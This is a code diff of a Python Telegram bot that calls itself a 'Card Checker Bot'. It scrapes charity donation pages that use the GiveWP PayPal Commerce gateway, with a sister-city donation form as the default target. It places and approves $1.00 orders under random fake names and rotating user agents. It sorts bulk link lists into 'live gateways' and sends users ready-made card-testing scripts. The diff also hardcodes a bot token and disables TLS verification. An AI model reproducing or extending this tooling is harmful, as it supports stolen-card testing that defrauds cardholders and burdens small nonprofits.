@@ -33,7 +33,7 @@ except ImportError:
             return random.choice(self.agents)
 
 # === بيانات البوت ===
-token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
+token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
 myid = ['6843321125']
@@ -160,24 +160,30 @@ def start(message):
     
     user_id = message.from_user.id
     userr = message.from_user.first_name
+    username = message.from_user.username or "No Username"
 
-    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.
-
-[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
-[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
-[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below
-
-[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
+    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
+[⚡] 𝐍𝐚𝐦𝐞: {userr}
+[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
+[⚡] 𝐈𝐃: <code>{user_id}</code>
+- - - - - - - - - - - - - - - - - - - - - -
+[⚡] PayPal Gateway >> /paypal 
+[⚡] Mass Extract >> /mass
+[⚡] Send Feedback >> Button Below
+- - - - - - - - - - - - - - - - - - - - - -
+[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
+[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
     
     FRA = types.InlineKeyboardMarkup(row_width=2)
     Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
     FRA.add(Yes22)
     
-    video_url = 'https://t.me/C0CCOCOvjk/9'
+    # صورة مدارة فخمة
+    photo_url = 'https://t.me/C0CCOCOvjk/9'
     try:
-        bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
+        bot.send_photo(message.chat.id, photo_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
     except:
-        pass
+        safe_send_message(message.chat.id, IU)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'yrr')
 def feedback(call):
@@ -186,7 +192,7 @@ def feedback(call):
     Atty = types.InlineKeyboardMarkup(row_width=1)
     back = types.InlineKeyboardButton("Back", callback_data="start")
     Atty.add(back)
-    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
+    YTT = f'''Welcome {userr} Send your message and the admin will respond.'''
     try:
         bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
     except:
@@ -222,7 +228,8 @@ def send_reply(message):
 def back_to_start(call):
     user_id = call.from_user.id
     userr = call.from_user.first_name
-    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
+    username = call.from_user.username or "No Username"
+    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'''
     FRA = types.InlineKeyboardMarkup(row_width=2)
     Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
     FRA.add(Yes22)
@@ -245,6 +252,7 @@ class PayPalCommerce:
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         self.donation = "1.00"
         self.r = requests.Session()
+        self.r.verify = False
         if HAS_FAKE_UA:
             self.uu = UserAgent()
         else:
@@ -254,6 +262,7 @@ class PayPalCommerce:
         self.client_token = None
         self.form_data = {}
         self.ajax_url = None
+        self.cookies = {}
         self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
         self.url = urlparse(self.target_url).netloc
         self.inurl = urlparse(self.target_url).path
@@ -268,6 +277,7 @@ class PayPalCommerce:
         try:
             headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
+            self.cookies = dict(response.cookies)
             html = response.text
             self._extract_client_id(html)
             self._extract_form_data(html)
@@ -331,7 +341,7 @@ class PayPalCommerce:
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-                response = self.r.post(self.ajax_url, data=data, headers=headers, timeout=10)
+                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -363,13 +373,27 @@ class PayPalCommerce:
         if not self.ajax_url:
             return None
         form_data = self.form_data.copy()
-        form_data.update({'give-amount': self.donation, 'payment-mode': 'paypal-commerce', 'give_first': random.choice(self.first_name), 'give_last': random.choice(self.last_name), 'give_email': self.email, 'give-gateway': 'paypal-commerce'})
-        headers = {'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+        form_data.update({
+            'give-amount': self.donation,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+        })
+        headers = {
+            'user-agent': self.uu.random,
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'https://{self.url}',
+            'referer': f'https://{self.url}{self.inurl}',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
         for action in actions:
             params = {'action': action}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -409,13 +433,27 @@ class PayPalCommerce:
         if not self.ajax_url:
             return None
         form_data = self.form_data.copy()
-        form_data.update({'give-amount': self.donation, 'payment-mode': 'paypal-commerce', 'give_first': random.choice(self.first_name), 'give_last': random.choice(self.last_name), 'give_email': self.email, 'give-gateway': 'paypal-commerce'})
-        headers = {'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+        form_data.update({
+            'give-amount': self.donation,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+        })
+        headers = {
+            'user-agent': self.uu.random,
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'https://{self.url}',
+            'referer': f'https://{self.url}{self.inurl}',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
         actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
         for action in actions:
             params = {'action': action, 'order': order_id}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                 if response.status_code == 200:
                     return response
             except:
@@ -663,15 +701,15 @@ if __name__ == '__main__':
                 print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                 time.sleep(13)''')
         
-        safe_send_document(massege.chat.id, file_name, caption=f'''The gate was successfully withdrawn ✅\n━━━━━━━━━━━━━━━━━━━━\n<strong>Gateway information ...</strong>\n\nLink: <code>{link}</code>\nResponse: <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr''')
+        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30''')
         os.remove(file_name)
 
     except:
         pass
 
-# ============ أمر bulk ============
-@bot.message_handler(commands=['bulk'])
-def bulk_extract_start(message):
+# ============ أمر mass ============
+@bot.message_handler(commands=['mass'])
+def mass_extract_start(message):
     with open("blockusers.txt", "r") as file:
         blocked = file.read().splitlines()
     if str(message.from_user.id) in blocked:
@@ -680,10 +718,10 @@ def bulk_extract_start(message):
 
     msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
     if msg:
-        bot.register_next_step_handler(msg, process_bulk_file)
+        bot.register_next_step_handler(msg, process_mass_file)
 
 @bot.message_handler(commands=['stop'])
-def stop_bulk(message):
+def stop_mass(message):
     user_id = message.from_user.id
     if user_id in processing_status:
         processing_status[user_id]['stop_flag'] = True
@@ -725,7 +763,7 @@ def check_single_link(link):
     except Exception as e:
         return {'link': link, 'live': False, 'respons': str(e)[:100]}
 
-def process_bulk_file(message):
+def process_mass_file(message):
     if not message.document:
         safe_send_message(message.chat.id, "❌ Please send a .txt file.")
         return
@@ -786,7 +824,7 @@ def process_bulk_file(message):
         updater = threading.Thread(target=update_status, daemon=True)
         updater.start()
 
-        time.sleep(2)  # راحة قبل الفحص
+        time.sleep(2)
 
         for idx, link in enumerate(links):
             if processing_status[user_id].get('stop_flag', False):
@@ -930,7 +968,7 @@ if __name__ == '__main__':
                         file_name = f'gateway_{live_idx}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
-                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr""")
+                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                         os.remove(file_name)
                         time.sleep(2)
                     except Exception as e:
@@ -939,7 +977,7 @@ if __name__ == '__main__':
                     processing_status[user_id]['dead'] += 1
                     processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
             
-            time.sleep(2)  # راحة بين المواقع
+            time.sleep(2)
         
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
@@ -949,7 +987,7 @@ if __name__ == '__main__':
         
         updater.join(timeout=2)
         
-        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @nnunrr"""
+        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30"""
         
         try:
             safe_edit_message(chat_id, status_msg.message_id, final_text)
